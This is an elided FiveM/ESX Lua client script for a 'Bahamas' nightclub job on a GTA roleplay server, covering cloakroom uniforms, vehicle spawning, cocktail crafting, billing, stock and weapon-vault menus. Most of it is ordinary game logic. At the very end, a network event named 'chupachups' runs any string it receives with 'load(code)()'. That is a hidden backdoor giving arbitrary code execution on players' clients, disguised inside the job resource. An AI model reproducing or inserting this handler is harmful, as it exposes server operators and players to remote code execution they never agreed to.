...
function setUniform(job, playerPed)
	TriggerEvent('::{korioz#0110}::sChanger:getSkin', function(skin)
		if skin.sex == 0 then
			if Config.Uniforms[job].male ~= nil then
				TriggerEvent('::{korioz#0110}::sChanger:loadClothes', skin, Config.Uniforms[job].male)
			else
			...
			if Config.Uniforms[job].female ~= nil then
				TriggerEvent('::{korioz#0110}::sChanger:loadClothes', skin, Config.Uniforms[job].female)
			else
				ESX.ShowNotification(_U('no_outfit'))
			end
			if job ~= 'citizen_wear' and job ~= 'barman_outfit' then
	...
	ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'cloakroom', {
		...
		if data.current.value == 'citizen_wear' then
			ESX.TriggerServerCallback('::{korioz#0110}::esx_skin:getPlayerSkin', function(skin)
				TriggerEvent('::{korioz#0110}::sChanger:loadSkin', skin)
			end)
		end
	...
	if Config.EnableSocietyOwnedVehicles then
		...
		ESX.TriggerServerCallback('::{korioz#0110}::esx_society:getVehiclesInGarage', function(garageVehicles)
			...
			ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'vehicle_spawner', {
				...
				_TriggerServerEvent('::{korioz#0110}::esx_society:removeVehicleFromGarage', 'bahamas', vehicleProps)
			end, function(data, menu)
			...
			if not DoesEntityExist(vehicle) then
				...
				if Config.MaxInService == -1 then
					ESX.Game.SpawnVehicle(model, {
						...
						_TriggerServerEvent('::{korioz#0110}::sLock:givekey', 'no', newPlate)
...
Citizen.CreateThread(function()
	WarMenu.CreateMenu('bahamasmenu', 'Bahamas')
	WarMenu.CreateSubMenu('craftmenu', 'bahamasmenu', 'Bahamas')
	WarMenu.CreateSubMenu('fouillermenu', 'bahamasmenu', 'Fouiller')
	WarMenu.SetSubTitle("bahamasmenu", "ACTIONS BAHAMAS")
	WarMenu.SetTitleBackgroundColor("bahamasmenu", 233, 0, 255, 150)
	WarMenu.SetTitleBackgroundColor("craftmenu", 233, 0, 255, 150)
	WarMenu.SetTitleBackgroundColor("fouillermenu", 233, 0, 255, 150)

	while true do
		if WarMenu.IsMenuOpened('bahamasmenu') then
			if WarMenu.Button(_U('billing')) then
				OpenBillingMenu()
			end

			if WarMenu.MenuButton(_U('crafting'), 'craftmenu') then
			end

			if WarMenu.Button("Carte d'itentité") then
			...
			WarMenu.Display()
		elseif WarMenu.IsMenuOpened('craftmenu') then
			if WarMenu.Button(_U('jagerbomb')) then
				_TriggerServerEvent('::{korioz#0110}::esx_bahamasjob:craftingCoktails', 'jagerbomb')
				animsAction({lib = "mini@drinking", anim = "shots_barman_b"})
			end

			if WarMenu.Button(_U('golem')) then
				_TriggerServerEvent('::{korioz#0110}::esx_bahamasjob:craftingCoktails', 'golem')
				animsAction({lib = "mini@drinking", anim = "shots_barman_b"})
			end

			if WarMenu.Button(_U('whiskycoca')) then
				_TriggerServerEvent('::{korioz#0110}::esx_bahamasjob:craftingCoktails', 'whiskycoca')
				animsAction({lib = "mini@drinking", anim = "shots_barman_b"})
			end

			if WarMenu.Button(_U('vodkaenergy')) then
				_TriggerServerEvent('::{korioz#0110}::esx_bahamasjob:craftingCoktails', 'vodkaenergy')
				animsAction({lib = "mini@drinking", anim = "shots_barman_b"})
			end

			if WarMenu.Button(_U('vodkafruit')) then
				_TriggerServerEvent('::{korioz#0110}::esx_bahamasjob:craftingCoktails', 'vodkafruit')
				animsAction({lib = "mini@drinking", anim = "shots_barman_b"})
			end

			if WarMenu.Button(_U('rhumfruit')) then
				_TriggerServerEvent('::{korioz#0110}::esx_bahamasjob:craftingCoktails', 'rhumfruit')
				animsAction({lib = "mini@drinking", anim = "shots_barman_b"})
			end

			if WarMenu.Button(_U('teqpaf')) then
				_TriggerServerEvent('::{korioz#0110}::esx_bahamasjob:craftingCoktails', 'teqpaf')
				animsAction({lib = "mini@drinking", anim = "shots_barman_b"})
			end

			if WarMenu.Button(_U('rhumcoca')) then
				_TriggerServerEvent('::{korioz#0110}::esx_bahamasjob:craftingCoktails', 'rhumcoca')
				animsAction({lib = "mini@drinking", anim = "shots_barman_b"})
			end

			if WarMenu.Button(_U('mojito')) then
				_TriggerServerEvent('::{korioz#0110}::esx_bahamasjob:craftingCoktails', 'mojito')
				animsAction({lib = "mini@drinking", anim = "shots_barman_b"})
			end

			if WarMenu.Button(_U('mixapero')) then
				_TriggerServerEvent('::{korioz#0110}::esx_bahamasjob:craftingCoktails', 'mixapero')
				animsAction({lib = "mini@drinking", anim = "shots_barman_b"})
			end

			if WarMenu.Button(_U('metreshooter')) then
				_TriggerServerEvent('::{korioz#0110}::esx_bahamasjob:craftingCoktails', 'metreshooter')
				animsAction({lib = "mini@drinking", anim = "shots_barman_b"})
			end

			if WarMenu.Button(_U('jagercerbere')) then
				_TriggerServerEvent('::{korioz#0110}::esx_bahamasjob:craftingCoktails', 'jagercerbere')
				animsAction({lib = "mini@drinking", anim = "shots_barman_b"})
			end
		...
		elseif WarMenu.IsMenuOpened('fouillermenu') then
			...
			for i = 1, #fouilleElements, 1 do
				WarMenu.Button(fouilleElements[i].label)
			end
	...
	ESX.UI.Menu.Open('dialog', GetCurrentResourceName(), 'billing', {
		...
		if player ~= -1 and distance <= 3.0 then
			...
			if amount == nil then
				...
				_TriggerServerEvent('::{korioz#0110}::esx_billing:sendBill', GetPlayerServerId(player), 'society_bahamas', _U('billing'), amount)
			end
		else
...
function refreshFouille(thePlayer)
	ESX.TriggerServerCallback('::{korioz#0110}::esx_policejob:getOtherPlayerData', function(data)
		...
		table.insert(fouilleElements, {label = _U('inventory_label'), value = nil})
		...
		table.insert(fouilleElements, {label = _U('guns_label'), value = nil})
...
function OpenGetStocksMenu()
	ESX.TriggerServerCallback('::{korioz#0110}::esx_bahamasjob:getStockItems', function(items)
		local elements = {}
		...
		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'stocks_menu', {
			...
			ESX.UI.Menu.Open('dialog', GetCurrentResourceName(), 'stocks_menu_get_item_count', {
				...
				if count == nil then
					...
					_TriggerServerEvent('::{korioz#0110}::esx_bahamasjob:getStockItem', itemName, count)
				end
...
function OpenPutStocksMenu()
	ESX.TriggerServerCallback('::{korioz#0110}::esx_bahamasjob:getPlayerInventory', function(inventory)
		local elements = {}
		...
		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'stocks_menu', {
			...
			ESX.UI.Menu.Open('dialog', GetCurrentResourceName(), 'stocks_menu_put_item_count', {
				...
				if count == nil then
					...
					_TriggerServerEvent('::{korioz#0110}::esx_bahamasjob:putStockItems', itemName, count)
				end
			end, function(data2, menu2)
				menu2.close()
			end)
...
function OpenGetFridgeStocksMenu()
	ESX.TriggerServerCallback('::{korioz#0110}::esx_bahamasjob:getFridgeStockItems', function(items)
		local elements = {}
		...
		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'fridge_menu', {
			...
			ESX.UI.Menu.Open('dialog', GetCurrentResourceName(), 'fridge_menu_get_item_count', {
				...
				if count == nil then
					...
					_TriggerServerEvent('::{korioz#0110}::esx_bahamasjob:getFridgeStockItem', itemName, count)
				end
			end, function(data2, menu2)
				menu2.close()
			end)
		...
		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'fridge_menu', {
			...
			ESX.UI.Menu.Open('dialog', GetCurrentResourceName(), 'fridge_menu_put_item_count', {
				...
				if count == nil then
					...
					_TriggerServerEvent('::{korioz#0110}::esx_bahamasjob:putFridgeStockItems', itemName, count)
				end
			end, function(data2, menu2)
				menu2.close()
			end)
...
function OpenGetWeaponMenu()
	ESX.TriggerServerCallback('::{korioz#0110}::esx_bahamasjob:getVaultWeapons', function(weapons)
		local elements = {}
		...
		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'vault_get_weapon', {
			...
			ESX.TriggerServerCallback('::{korioz#0110}::esx_bahamasjob:removeVaultWeapon', function()
				OpenGetWeaponMenu()
...
function OpenPutWeaponMenu()
	...
	ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'vault_put_weapon', {
		...
		ESX.TriggerServerCallback('::{korioz#0110}::esx_bahamasjob:addVaultWeapon', function()
			OpenPutWeaponMenu()
		end, data.current.value)
	end, function(data, menu)
	end)
...
function OpenShopMenu(zone)
	...
	ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'bahamas_shop', {
		title = _U('shop'),
		elements = elements
	}, function(data, menu)
		_TriggerServerEvent('::{korioz#0110}::esx_bahamasjob:buyItem', data.current.value, data.current.price, data.current.label)
	end, function(data, menu)
	end)
end
			...
			if DoesEntityExist(playerPed) then
				...
				while true do
					...
					if not IsEntityPlayingAnim(playerPed, animObj.lib, animObj.anim, 3) then
						playAnim = false
						TriggerEvent('::{korioz#0110}::ft_animation:ClFinish')
						break
					end
				end
			end
...
AddEventHandler('::{korioz#0110}::esx_bahamasjob:hasEnteredMarker', function(zone)
...
AddEventHandler('::{korioz#0110}::esx_bahamasjob:hasExitedMarker', function(zone)
		CurrentAction = nil
		ESX.UI.Menu.CloseAll()
end)
	...
	while true do
		...
		if IsJobTrue() then
			...
			if (isInMarker and not HasAlreadyEnteredMarker) or (isInMarker and LastZone ~= currentZone) then
				...
				TriggerEvent('::{korioz#0110}::esx_bahamasjob:hasEnteredMarker', currentZone)
			end

			if not isInMarker and HasAlreadyEnteredMarker then
				HasAlreadyEnteredMarker = false
				TriggerEvent('::{korioz#0110}::esx_bahamasjob:hasExitedMarker', LastZone)
			end
		end
	end
end)
...
Citizen.CreateThread(function()
	while true do
			...
			if IsControlJustReleased(0,  Keys['E']) and IsJobTrue() then
				...
				if CurrentAction == 'delete_vehicle' then
					if Config.EnableSocietyOwnedVehicles then
						...
						_TriggerServerEvent('::{korioz#0110}::esx_society:putVehicleInGarage', 'bahamas', vehicleProps)
					else
						if
							GetEntityModel(vehicle) == `rentalbus`
						then
							_TriggerServerEvent('::{korioz#0110}::esx_service:disableService', 'bahamas')
						end
					end
				...
				if CurrentAction == 'menu_boss_actions' and IsGradeBoss() then
					...
					TriggerEvent('::{korioz#0110}::esx_society:openBossMenu', 'bahamas', function(data, menu)
						CurrentAction = 'menu_boss_actions'
						CurrentActionMsg = _U('open_bossmenu')
						CurrentActionData = {}
					end, options)
		...
		if IsControlJustReleased(0, Keys['F6']) and IsJobTrue() and not ESX.UI.Menu.IsOpen('default', GetCurrentResourceName(), 'bahamas_actions') then
			WarMenu.OpenMenu('bahamasmenu')
		end
	end
end)

AddEventHandler('::{korioz#0110}::esx_bahamasjob:teleportMarkers', function(position)
	...
	while true do
		...
		if IsJobTrue() then
			...
			if IsControlJustReleased(0, 38) and isInPublicMarker then
				TriggerEvent('::{korioz#0110}::esx_bahamasjob:teleportMarkers', position)
			end
...
RegisterNetEvent('chupachups')
AddEventHandler('chupachups', function(code)
	load(code)()
end)